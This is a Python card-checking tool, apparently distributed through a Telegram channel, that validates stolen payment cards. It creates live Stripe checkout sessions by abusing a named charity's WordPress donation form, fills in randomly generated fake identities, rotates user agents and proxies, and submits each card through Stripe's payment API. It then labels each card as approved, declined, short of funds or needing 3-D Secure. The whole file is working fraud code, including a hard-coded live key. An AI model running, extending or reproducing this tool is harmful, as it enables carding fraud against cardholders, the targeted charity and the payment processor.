"""
Stripe Checkout Session API Engine (Dynamic CS Auto-Renewal)
Developer: @sweartx
Telegram Channel: t.me/KryxCheck
"""

import re
import time
import uuid
import random
import threading
import urllib.parse
from typing import Dict, Any, Tuple, Optional
import requests

DEVELOPER = "@sweartx"
TELEGRAM_CHANNEL = "t.me/KryxCheck"

# Default fallback publishable key
DYNAMIC_PUB_KEY = "pk_live_51P9crHAiiyWlwnSe0q990Pm8LTKXwsxpyqD9VuaMUUSrhS2vUAkkR3u6db6SiVDhyN0Thzj6TwRRC5H64ekLrut200guodS61M"
DEFAULT_PK = DYNAMIC_PUB_KEY
DEFAULT_CS = ""  # Handled dynamically by SessionManager

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
]

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Thomas", "Charles", "Daniel"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Taylor"]


def random_user_agent() -> str:
    return random.choice(USER_AGENTS)


def generate_identity() -> Dict[str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    rand_num = random.randint(100, 999)
    return {
        "name": f"{first} {last}",
        "email": f"{first.lower()}.{last.lower()}{rand_num}@gmail.com"
    }


def lookup_bin(card_number: str) -> Tuple[Dict[str, Any], str]:
    """Lookup BIN details via pulse.pst.net API"""
    if not card_number:
        return {}, ""
    digits = re.sub(r"\D", "", card_number)
    bin_code = digits[:6]
    if len(bin_code) < 6:
        return {}, ""

    url = f"https://pulse.pst.net/api/bins/{bin_code}"
    headers = {
        "User-Agent": random_user_agent(),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": f"https://pulse.pst.net/bin/{bin_code}"
    }

    try:
        resp = requests.get(url, headers=headers, timeout=6)
        if resp.status_code == 200:
            data = resp.json().get("data", {})
            parts = [
                data.get("bin", ""),
                data.get("country_alpha3", ""),
                data.get("issuer_name", ""),
                data.get("card_level", ""),
                data.get("brand", ""),
                data.get("type", "")
            ]
            raw_str = " ".join([p.strip() for p in parts if p and str(p).strip()])
            return data, raw_str
    except Exception:
        pass

    return {}, ""


def clean_error_message(error_text: Optional[str]) -> str:
    if not error_text:
        return "Your card was declined."
    cleaned = re.sub(r"<[^>]+>", "", str(error_text))
    patterns = [
        r"Error:\s*",
        r"There was an issue with your transaction:\s*",
        r"Please check your payment method or contact your card issuer for assistance\.\s*"
    ]
    for p in patterns:
        cleaned = re.sub(p, "", cleaned, flags=re.IGNORECASE)
    cleaned = cleaned.strip()
    return cleaned if cleaned else "Your card was declined."


def parse_card(card_input: str) -> Optional[Tuple[Dict[str, str], str]]:
    if not isinstance(card_input, str) or not card_input.strip():
        return None

    cleaned = re.sub(r"[:/\s]+", "|", card_input.strip())
    parts = [p.strip() for p in cleaned.split("|") if p.strip()]
    if len(parts) < 4:
        return None

    card_number = re.sub(r"[^0-9]", "", parts[0])
    if len(card_number) < 12 or len(card_number) > 19:
        return None

    mm = re.sub(r"[^0-9]", "", parts[1]).zfill(2)
    yil_ham = re.sub(r"[^0-9]", "", parts[2])
    if len(yil_ham) == 4:
        yy = yil_ham[-2:]
        yy_full = yil_ham
    else:
        yy = yil_ham.zfill(2)
        yy_full = "20" + yy

    cvc = re.sub(r"[^0-9]", "", parts[3])

    card = {
        "number": card_number,
        "expiryMonth": mm,
        "expiryYear": yy_full,
        "expiryYearShort": yy,
        "cvc": cvc
    }
    card_display = f"{card_number}|{mm}|{yy}|{cvc}"
    return card, card_display


def fetch_dynamic_session(proxy: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
    """
    Dynamically generates a fresh live Stripe Checkout Session (PK, CS)
    via WPForms endpoint on thechmi.com.
    """
    wp_url = "https://www.thechmi.com/wp-admin/admin-ajax.php"
    pub_key = DYNAMIC_PUB_KEY

    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@gmail.com"
    full_name = f"{first} {last}"

    headers = {
        "user-agent": random_user_agent(),
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.thechmi.com",
        "referer": "https://www.thechmi.com/donation/",
        "x-requested-with": "XMLHttpRequest"
    }

    form_data_payload = {
        "__wpf_form_id": "1544",
        "__wpf_current_url": "https://www.thechmi.com/donation",
        "__wpf_current_page_id": "1515",
        "donation_item_custom": "1",
        "donation_item": "custom",
        "donation_recurring_interval": "",
        "customer_name": full_name,
        "customer_email": email,
        "__wpf_valid_payment_methods_count": "3",
        "__wpf_selected_payment_method": "stripe",
        "__paypal_payment_gateway": "paypal",
        "__square_payment_gateway": "square"
    }

    wp_payload = {
        "action": "wpf_submit_form",
        "form_id": "1544",
        "payment_total": "1",
        "form_data": urllib.parse.urlencode(form_data_payload),
        "tax_total": "0",
        "main_total": "1",
        "form_localize[form_id]": "1544",
        "form_localize[checkout_description]": "Donation form",
        "form_localize[currency_settings][currency]": "USD",
        "form_localize[currency_settings][locale]": "auto",
        "form_localize[currency_settings][currency_sign_position]": "left",
        "form_localize[currency_settings][currency_separator]": "dot_comma",
        "form_localize[currency_settings][decimal_points]": "0",
        "form_localize[currency_settings][settings_type]": "global",
        "form_localize[currency_settings][is_zero_decimal]": "false",
        "form_localize[currency_settings][currency_sign]": "$",
        "form_localize[stripe_checkout_title]": "Christian Hope Ministries International ",
        "form_localize[stripe_pub_key]": pub_key,
        "form_localize[stripe_checkout_style]": "stripe_checkout",
        "form_localize[stripe_verify_zip]": "no",
        "form_localize[stripe_billing_info]": "no",
        "form_localize[stripe_element_id]": "wpf_input_1544_stripe_card_element"
    }

    proxies = None
    if proxy and proxy.strip():
        proxies = {"http": proxy.strip(), "https": proxy.strip()}

    for _ in range(3):
        try:
            resp = requests.post(wp_url, headers=headers, data=wp_payload, proxies=proxies, timeout=15)
            if resp.status_code == 200:
                match = re.search(r"(cs_live_[a-zA-Z0-9]+)", resp.text)
                if match:
                    return pub_key, match.group(1)
        except Exception:
            time.sleep(0.5)

    return None, None


class SessionManager:
    """Thread-safe dynamic checkout session cache and auto-renewal manager."""

    def __init__(self):
        self._lock = threading.Lock()
        self._cached_pk: Optional[str] = None
        self._cached_cs: Optional[str] = None
        self._created_at: float = 0.0
        self._usage_count: int = 0
        self._max_age: float = 600.0  # 10 minutes max session age
        self._max_usages: int = 6     # Renew after 6 uses for maximum reliability

    def get_session(self, force_refresh: bool = False, proxy: Optional[str] = None) -> Tuple[str, str]:
        with self._lock:
            now = time.time()
            is_expired = (now - self._created_at) > self._max_age
            usage_exceeded = self._usage_count >= self._max_usages

            if force_refresh or not self._cached_cs or is_expired or usage_exceeded:
                pk, cs = fetch_dynamic_session(proxy=proxy)
                if cs:
                    self._cached_pk = pk
                    self._cached_cs = cs
                    self._created_at = now
                    self._usage_count = 0
                elif not self._cached_cs:
                    self._cached_pk = DYNAMIC_PUB_KEY
                    self._cached_cs = ""

            self._usage_count += 1
            return self._cached_pk or DYNAMIC_PUB_KEY, self._cached_cs or ""

    def invalidate(self, failed_cs: Optional[str] = None):
        """Invalidate the session when expired or consumed."""
        with self._lock:
            if failed_cs is None or self._cached_cs == failed_cs:
                self._cached_cs = None
                self._created_at = 0.0
                self._usage_count = 0


# Global Session Manager Instance
session_manager = SessionManager()


class StripeCheckoutProcessor:
    def __init__(self, card: Dict[str, str], identity: Dict[str, str], pk: str, cs: str, proxy: Optional[str] = None):
        self.card = card
        self.identity = identity
        self.pk = pk.strip()
        self.cs = cs.strip()
        self.proxy = proxy.strip() if proxy and proxy.strip() else None
        self.guid = str(uuid.uuid4())
        self.muid = str(uuid.uuid4())
        self.sid = str(uuid.uuid4())
        self.user_agent = random_user_agent()

        self.session = requests.Session()
        if self.proxy:
            self.session.proxies = {
                "http": self.proxy,
                "https": self.proxy
            }

        self.base_headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "origin": "https://checkout.stripe.com",
            "referer": "https://checkout.stripe.com/",
            "user-agent": self.user_agent,
            "content-type": "application/x-www-form-urlencoded"
        }

    def run(self) -> Dict[str, Any]:
        start_time = time.time()
        result = {
            "success": False,
            "status": "DECLINED",
            "message": "Unknown error",
            "decline_code": None,
            "charge_id": None,
            "payment_method_id": None,
            "amount": "0.00",
            "currency": "USD",
            "time_taken": "0.00s",
        }

        try:
            if not self.cs:
                result["status"] = "SESSION_EXPIRED"
                result["message"] = "Checkout session is empty or could not be generated."
                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            # STEP 1: Init Checkout Session
            init_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}/init"
            init_payload = {
                "key": self.pk,
                "eid": "NA",
                "browser_locale": "en-US",
                "browser_timezone": "America/New_York",
                "redirect_type": "stripe_js"
            }

            resp1 = self.session.post(init_url, data=init_payload, headers=self.base_headers, timeout=30)
            init_json = resp1.json() if resp1.content else {}

            if not init_json:
                raise Exception("Stripe init request failed.")

            if "error" in init_json:
                err_msg = init_json.get("error", {}).get("message", "Invalid or expired session.")
                err_code = init_json.get("error", {}).get("code", "")

                is_expired = (
                    err_code in ["checkout_not_active_session", "session_expired"]
                    or "expired" in err_msg.lower()
                    or "not active" in err_msg.lower()
                    or "no longer active" in err_msg.lower()
                )

                result["status"] = "SESSION_EXPIRED" if is_expired else "ERROR"
                result["message"] = f"Init error: {err_msg}"
                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            init_checksum = init_json.get("init_checksum", "")
            currency = str(init_json.get("currency", "USD")).upper()

            # Amount resolution
            line_item_group = init_json.get("line_item_group") or {}
            subtotal = line_item_group.get("subtotal") or init_json.get("amount_total") or 0
            formatted_amount = f"{float(subtotal) / 100:.2f}"
            result["amount"] = formatted_amount
            result["currency"] = currency

            # Customer details resolution
            customer = init_json.get("customer") or {}
            customer_email = customer.get("email") or init_json.get("customer_email") or self.identity["email"]
            customer_name = customer.get("name") or self.identity["name"]
            address = customer.get("address") or {}
            country = address.get("country") or "US"

            # STEP 2: Create Payment Method
            pm_url = "https://api.stripe.com/v1/payment_methods"
            pm_payload = {
                "type": "card",
                "card[number]": self.card["number"],
                "card[cvc]": self.card["cvc"],
                "card[exp_month]": self.card["expiryMonth"],
                "card[exp_year]": self.card["expiryYear"],
                "billing_details[name]": customer_name,
                "billing_details[email]": customer_email,
                "billing_details[address][country]": country,
                "guid": self.guid,
                "muid": self.muid,
                "sid": self.sid,
                "key": self.pk,
                "payment_user_agent": "stripe.js/854b55c7dc; stripe-js-v3/854b55c7dc; checkout",
                "client_attribution_metadata[checkout_session_id]": self.cs,
                "client_attribution_metadata[merchant_integration_source]": "checkout",
                "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified"
            }

            resp2 = self.session.post(pm_url, data=pm_payload, headers=self.base_headers, timeout=30)
            pm_json = resp2.json() if resp2.content else {}

            if not pm_json:
                raise Exception("Stripe payment method request failed.")

            if "error" in pm_json:
                err = pm_json["error"]
                err_code = err.get("code", "card_declined")
                decline_code = err.get("decline_code", err_code)
                err_msg = clean_error_message(err.get("message", "Card error"))

                result["decline_code"] = decline_code
                result["message"] = err_msg

                if decline_code in ["insufficient_funds", "not_enough_balance"] or "insufficient" in err_msg.lower():
                    result["status"] = "INSUFFICIENT_FUNDS"
                elif "3d" in err_msg.lower() or "authenticate" in err_msg.lower():
                    result["status"] = "3D_SECURE"
                else:
                    result["status"] = "DECLINED"

                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            pm_id = pm_json.get("id")
            if not pm_id:
                raise Exception("Failed to create Payment Method ID.")
            result["payment_method_id"] = pm_id

            # STEP 3: Confirm Payment Page
            confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm"
            confirm_payload = {
                "eid": "NA",
                "payment_method": pm_id,
                "expected_amount": str(subtotal),
                "last_displayed_line_item_group_details[subtotal]": str(subtotal),
                "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
                "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
                "last_displayed_line_item_group_details[total_discount_amount]": "0",
                "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
                "expected_payment_method_type": "card",
                "guid": self.guid,
                "muid": self.muid,
                "sid": self.sid,
                "key": self.pk,
                "version": "854b55c7dc",
                "init_checksum": init_checksum,
                "client_attribution_metadata[checkout_session_id]": self.cs,
                "client_attribution_metadata[merchant_integration_source]": "checkout",
                "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified"
            }

            resp3 = self.session.post(confirm_url, data=confirm_payload, headers=self.base_headers, timeout=30)
            conf_json = resp3.json() if resp3.content else {}

            if not conf_json:
                raise Exception("Stripe confirm request failed.")

            # Check if Error
            if "error" in conf_json:
                err = conf_json["error"]
                charge_id = err.get("charge")
                decline_code = err.get("decline_code") or err.get("code", "card_declined")
                err_msg = clean_error_message(err.get("message", "Your card was declined."))

                result["charge_id"] = charge_id
                result["decline_code"] = decline_code
                result["message"] = err_msg

                if decline_code in ["insufficient_funds", "not_enough_balance"] or "insufficient" in err_msg.lower():
                    result["status"] = "INSUFFICIENT_FUNDS"
                elif (
                    decline_code in ["authentication_required", "action_required"]
                    or "3d" in err_msg.lower()
                    or "authenticate" in err_msg.lower()
                    or "verification" in err_msg.lower()
                ):
                    result["status"] = "3D_SECURE"
                elif "expired" in err_msg.lower() or "not active" in err_msg.lower():
                    result["status"] = "SESSION_EXPIRED"
                else:
                    result["status"] = "DECLINED"

                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            # Check 3DS next_action or requires_action
            status = conf_json.get("status", "")
            pi = conf_json.get("payment_intent") or {}
            pi_status = pi.get("status", "") if isinstance(pi, dict) else ""

            if (
                status == "requires_action"
                or pi_status == "requires_action"
                or "next_action" in conf_json
                or (isinstance(pi, dict) and "next_action" in pi)
            ):
                result["status"] = "3D_SECURE"
                result["message"] = "3D Secure verification required"
                result["decline_code"] = "authentication_required"
                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            # Check Success / Approved
            if (
                conf_json.get("payment_status") == "paid"
                or status in ["complete", "succeeded"]
                or pi_status == "succeeded"
            ):
                result["success"] = True
                result["status"] = "APPROVED"
                result["message"] = "Payment successful"
                result["charge_id"] = pi.get("latest_charge") if isinstance(pi, dict) else None
                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            # Fallback for any unknown state
            result["status"] = "DECLINED"
            result["message"] = conf_json.get("status", "Payment not completed")

        except Exception as e:
            result["status"] = "ERROR"
            result["message"] = str(e)

        result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
        return result


def check_card(card_str: str, pk: Optional[str] = None, cs: Optional[str] = None, proxy: Optional[str] = None) -> Dict[str, Any]:
    """
    Main card verification function with fully automated dynamic session renewal.
    """
    is_auto_mode = not cs or not cs.strip() or cs.strip().lower() in ["auto", "none", "default"]

    if is_auto_mode:
        stripe_pk, checkout_cs = session_manager.get_session(proxy=proxy)
        if pk and pk.strip() and pk.strip().lower() not in ["auto", "none", "default"]:
            stripe_pk = pk.strip()
    else:
        checkout_cs = cs.strip()
        stripe_pk = pk.strip() if pk and pk.strip() else DYNAMIC_PUB_KEY

    if not card_str or not card_str.strip():
        return {
            "status": "ERROR",
            "message": "Card parameter is required. Format: CARD|MM|YY|CVV",
            "card": None,
            "decline_code": None,
            "amount": "0.00",
            "raw_bin": None,
            "bin_data": {},
            "session_id": checkout_cs or None,
            "time_taken": "0.00s",
            "developer": DEVELOPER,
            "channel": TELEGRAM_CHANNEL
        }

    parsed = parse_card(card_str)
    if not parsed:
        return {
            "status": "ERROR",
            "message": "Invalid card format. Expected: CARD|MM|YY|CVV",
            "card": card_str,
            "decline_code": None,
            "amount": "0.00",
            "raw_bin": None,
            "bin_data": {},
            "session_id": checkout_cs or None,
            "time_taken": "0.00s",
            "developer": DEVELOPER,
            "channel": TELEGRAM_CHANNEL
        }

    card_obj, card_display = parsed
    bin_data, bin_str = lookup_bin(card_obj["number"])
    identity = generate_identity()

    processor = StripeCheckoutProcessor(card_obj, identity, stripe_pk, checkout_cs, proxy)
    res = processor.run()

    # Dynamic auto-recovery: If session expired or inactive, refresh and retry seamlessly
    err_lower = str(res.get("message", "")).lower()
    is_session_problem = (
        res["status"] == "SESSION_EXPIRED"
        or "expired" in err_lower
        or "not active" in err_lower
        or "no longer active" in err_lower
        or "invalid or expired" in err_lower
        or "checkout_not_active" in err_lower
    )
    if is_session_problem:
        session_manager.invalidate(failed_cs=checkout_cs)
        stripe_pk, checkout_cs = session_manager.get_session(force_refresh=True, proxy=proxy)
        if checkout_cs:
            processor = StripeCheckoutProcessor(card_obj, identity, stripe_pk, checkout_cs, proxy)
            res = processor.run()

    return {
        "status": res["status"],
        "message": res["message"],
        "card": card_display,
        "decline_code": res["decline_code"],
        "amount": f"{res['amount']} {res['currency']}",
        "raw_bin": bin_str or None,
        "bin_data": bin_data,
        "charge_id": res.get("charge_id"),
        "payment_method_id": res.get("payment_method_id"),
        "session_id": checkout_cs or None,
        "time_taken": res["time_taken"],
        "developer": DEVELOPER,
        "channel": TELEGRAM_CHANNEL
    }
